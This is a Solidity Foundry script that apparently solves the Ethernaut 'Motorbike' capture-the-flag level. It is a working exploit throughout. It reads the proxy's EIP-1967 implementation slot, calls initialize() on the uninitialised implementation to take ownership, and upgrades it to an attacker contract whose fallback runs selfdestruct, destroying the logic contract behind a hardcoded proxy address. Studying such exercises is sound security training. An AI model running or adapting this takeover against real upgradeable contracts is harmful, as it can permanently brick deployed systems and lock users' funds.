// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Motorbike.sol";
import {Script} from "forge-std/Script.sol";

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}

contract MotorbikeScript is Script {
    Motorbike public motorbike;
    address public engine;

    function setUp() public {
        motorbike = Motorbike(payable(address(0x07933004dF392CcD0558b4118B96c52962C79B98)));
        engine = Engine(address(uint160(uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));
    }

    function run() public {
        vm.startBroadcast();
        new Attack().destroy(engine);
        vm.stopBroadcast();
    }
}

contract Attack {
    function destroy(address engineAddr) external {
        IEngine engine = IEngine(engineAddr);
        engine.initialize();
        engine.upgradeToAndCall(address(this), "");
    }

    fallback() external payable {
        selfdestruct(payable(address(0)));
    }

    receive() external payable {}
}
